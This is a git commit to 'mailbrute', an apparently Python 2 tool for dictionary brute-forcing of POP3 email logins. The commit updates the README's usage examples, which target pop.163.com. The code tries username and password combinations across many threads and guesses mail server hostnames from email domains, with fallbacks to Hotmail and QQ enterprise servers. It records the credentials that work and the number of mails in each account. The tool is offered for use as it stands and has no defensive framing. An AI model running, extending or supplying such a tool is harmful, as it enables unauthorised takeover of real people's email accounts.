b4f9824050675d79539e88af266e5e2bc50ad9b2
llq007 <liaoyongping@gmail.com>
2016-07-23 09:29:34 +0800

    update

--- README.md
+++ README.md
@@ -1,5 +1,5 @@
 ﻿# mailbrute
-================
+
 ## Lib安装：
 
 ####     easy_install threadpool
@@ -15,7 +15,7 @@
 ===============
 ## Usage：
 
-* mailbrute.py [Options]
+* mailbrute.py [Options]...
 	* -U  <用户名字典文件> (需放在mailbrute.py同目录下)
 	* -P  <密码字典文件>   (需放在mailbrute.py同目录下)
 	* -s  <完整的POP服务器域名>，例如：pop.163.com
@@ -23,10 +23,10 @@
 	* -t  线程数，默认为10
 	* -d  延迟时间，默认0.5秒，防止服务器堵塞，漏报
 	* -E  自动从用户名字典中提取@后面的域名作为pop服务器爆破
-* 示例1：
+	* 示例1：
 
-	#### mailbrute.py -U user.txt -P pass.txt -s pop.163.com -p 110
-* 示例2：
+		#### mailbrute.py -U user.txt -P pass.txt -s pop.163.com -p 110
+	* 示例2：
 
-	#### mailbrute.py -U user.txt -P pass.txt -p 110 -E 
+		#### mailbrute.py -U user.txt -P pass.txt -p 110 -E 
 
--- mailbrute.py
+++ mailbrute.py
@@ -1,9 +1,10 @@
-# !usr/bin/python                                           #
-# -*- coding: utf-8 -*-                                     #
+#!usr/bin/env python                                        #
+#-*- coding: utf-8 -*-                                      #
 #-----------------------------------------------------------#
 #MailBruteforce.py version 0.10                             #
 #Author: linglingqi  (2016.07.13)                           #
 #-------Modules---------------------------------------------#
+from __future__ import division
 import threadpool
 import time
 import poplib
@@ -14,6 +15,7 @@ user_list=[]
 pass_list=[]
 userpass_list=[] 
 payload_num=0
+completed_num=0
 success_results=[]
 user_file_path=""
 pass_file_path=""
@@ -23,23 +25,22 @@ threads_num=0
 delay_time=0
 userpass_check_type=False   
 auto_extract_domain=False
-remove_suffix=False
+
 #--------Functions------------------------------------------#
 def print_result(request, result):
     print '-'*80
     print result
     
-def checkserver(domain):
+def checkserver(domain,port):
     #Check the sever connection
     try:
-        if port_intruded==995:
-            pop_chk=poplib.POP3_SSL(domain,port_intruded)
+        if port==995:
+            pop_chk=poplib.POP3_SSL(domain,port)
         else:
-            pop_chk=poplib.POP3(domain,port_intruded)
+            pop_chk=poplib.POP3(domain,port)
         pop_chk.quit()
         return True
     except Exception,e:
-        print "\n[+] Error: %s"%(e)
         return False
 
 def dict_processing():
@@ -72,33 +73,66 @@ def dict_processing():
         
     except Exception,e:
         print "[-] Error: %s\n"%(e)
-        sys.exit(1)
-
+        
 def mailbruteforce(login_info):
     try:
-        user_pass=login_info.split(":")
-        login_user=user_pass[0].strip()
-        login_pass=user_pass[1].strip()
+        global completed_num
+       
+        login_user=login_info.split(":")[0].strip()
+        login_pass=login_info.split(":")[1].strip()
         server_checked=domain_intruded
+        port_checked=port_intruded
         
         #extract the domain from username
         if auto_extract_domain and login_user.find("@")>0:
-            str_extract=login_user.split("@")
-            if remove_suffix:
-                login_user=str_extract[0]
-            server_checked=str_extract[1]
-        if port_intruded==995:
-            pop_login=poplib.POP3_SSL(server_checked,port_intruded)
+            server_var=login_user.split("@")[1].strip()
+            
+            #check the server domain
+            if checkserver(server_var,port_checked):
+                server_checked=server_var
+            else:
+                if server_var.lower()=="hotmail.com":
+                    server_checked="pop3.live.com"
+                    port_checked=995
+                else:
+                    is_break=False
+                    for domain_prefix in domain_prefix_list:
+                        if server_var.count(".")<=2:
+                            server_checked=domain_prefix+"."+server_var
+                        elif server_var.count(".")==3:
+                            server_checked=domain_prefix+"."+server_var[server_var.index('.')+1:]
+                        port_checked=110
+                        if checkserver(server_checked,port_checked):
+                            is_break=True
+                            break
+                        else:
+                            port_checked=995
+                            if checkserver(server_checked,port_checked):
+                                is_break=True
+                                break
+                    if not is_break:
+                        server_checked="pop.exmail.qq.com"
+                        port_checked=110
+        if port_checked==995:
+            pop_login=poplib.POP3_SSL(server_checked,port_checked)
         else:
-            pop_login=poplib.POP3(server_checked,port_intruded)
-        pop_login.user(login_user)
-        auth=pop_login.pass_(login_pass)
-        if  "+OK" in auth:
+            pop_login=poplib.POP3(server_checked,port_checked)
+        
+        user_auth=pop_login.user(login_user)
+        if "+OK" in user_auth.upper():
+            pass
+        else:
+            if login_user.find("@")>0:
+                user_auth=pop_login.user(login_user.split("@")[0].strip())
+        pass_auth=pop_login.pass_(login_pass)
+        if  "+OK" in pass_auth.upper():
             success_results.append(login_info)
-            feeback_info="[+] Success: User: %s, Pass: %s, Server: %s, Mails: %s"%(login_user,login_pass,server_checked,pop_login.stat()[0])
+            completed_num+=1
+            feeback_info="[+] Success: User: %s, Pass: %s, Server: %s:%s, Mails: %s, Completed: %.2f%%, Success: %s"%(login_user,login_pass,server_checked,port_checked,pop_login.stat()[0],completed_num/payload_num*100,len(success_results))
         pop_login.quit()
     except Exception,e:
-        feeback_info="[+] Error: User: %s, Pass: %s, Server: %s, %s"%(login_user,login_pass,server_checked,e)
+        completed_num+=1
+        feeback_info="[+] Error: User: %s, Pass: %s, Server: %s:%s, %s, Completed: %.2f%%, Success: %s"%(login_user,login_pass,server_checked,port_checked,e,completed_num/payload_num*100,len(success_results))
     
     #delaying time,reduce error to connect sever
     time.sleep(delay_time)
@@ -130,40 +164,40 @@ if __name__=='__main__':
         print "[+] Error %s"%(e)
         (options,args)=parser.parse_args(["-h"])
     
-    #if remove the domain suffix from username    
-    if auto_extract_domain:
-        user_input=raw_input("Do you remove domain suffix from username?[y/n]: ")
-        if user_input=="y" or user_input=="Y":
-            remove_suffix=True
-        else:
-            remove_suffix=False
+    #if go to check
+    if not auto_extract_domain:
+        if not checkserver(domain_intruded,port_intruded):
+            print "[+] Error: Server don't connect."
+            sys.exit()
+    else:
+        domain_prefix_list=["pop","pop3","mail","webmail"]
     
-    if checkserver(domain_intruded) or auto_extract_domain:
-        user_input=raw_input("Do you check all of the users and passwords combination?[y/n]: ")
-        if user_input=="y" or user_input=="Y":
-            userpass_check_type=True
-        else:
-            userpass_check_type=False
-        
-        #process user and pass, generate a new userpass_list
-        dict_processing() 
-        #print main information checked
-        print "\n[+] Thread num: %s"%(threads_num)
-        print "[+] Server: %s"%(domain_intruded)
-        print "[+] Users loaded: %s"%(len(user_list))
-        print "[+] Passwords loaded: %s"%(len(pass_list))
-        print "[+] Payload num: %s\n"%(payload_num)
-        
-        #Creat threadpool
-        pool=threadpool.ThreadPool(threads_num)
-        requests=threadpool.makeRequests(mailbruteforce,userpass_list,print_result)
-        [pool.putRequest(req) for req in requests]
-        pool.wait()
-        pool.dismissWorkers(threads_num, do_join=True)#To use dismissWorkers,prevent mistakes
-        
-        #print the success result
-        print "\n"
-        print "-"*80
-        print "[-] Done."
-        for result_out in success_results:
-            print "[-] Successful login: %s"%(result_out)
+    #begin checking
+    user_input=raw_input("Do you check all of the users and passwords combination?[y/n]: ")
+    if user_input=="y" or user_input=="Y":
+        userpass_check_type=True
+    else:
+        userpass_check_type=False
+    
+    #process user and pass, generate a new userpass_list
+    dict_processing() 
+    #print main information checked
+    print "\n[+] Thread num: %s"%(threads_num)
+    print "[+] Server: %s"%(domain_intruded)
+    print "[+] Users loaded: %s"%(len(user_list))
+    print "[+] Passwords loaded: %s"%(len(pass_list))
+    print "[+] Payload num: %s\n"%(payload_num)
+    
+    #creat threadpool
+    pool=threadpool.ThreadPool(threads_num)
+    requests=threadpool.makeRequests(mailbruteforce,userpass_list,print_result)
+    [pool.putRequest(req) for req in requests]
+    pool.wait()
+    pool.dismissWorkers(threads_num, do_join=True)#To use dismissWorkers,prevent mistakes
+    
+    #print the success result
+    print "\n"
+    print "-"*80
+    print "[-] Done."
+    for result_out in success_results:
+        print "[-] Successful login: %s"%(result_out)
